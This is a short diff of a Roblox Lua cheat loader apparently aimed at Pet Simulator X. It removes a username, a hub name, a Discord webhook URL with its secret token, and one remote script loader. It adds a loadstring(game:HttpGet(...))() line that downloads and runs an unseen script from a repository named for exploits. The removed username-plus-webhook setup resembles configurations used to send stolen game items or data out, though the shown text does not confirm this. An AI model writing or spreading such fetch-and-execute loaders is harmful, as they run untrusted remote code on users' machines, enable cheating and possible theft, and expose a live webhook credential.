@@ -1,5 +1,1 @@
-_G.Username = "MigoWorld_MgW"
-_G.HubName = "Obsidians"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1138735217243344936/3_Uwgl6iU0b8M4FmI7tfHgwYHxwLM1VowyJssnIqg8jwrPzASoKgXBnu6c8dMAOkkHG4"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iexploitzhaha/best-free-psx-script-obsidians-/main/Obsidians%20free%20psx%20OP%20script"))()
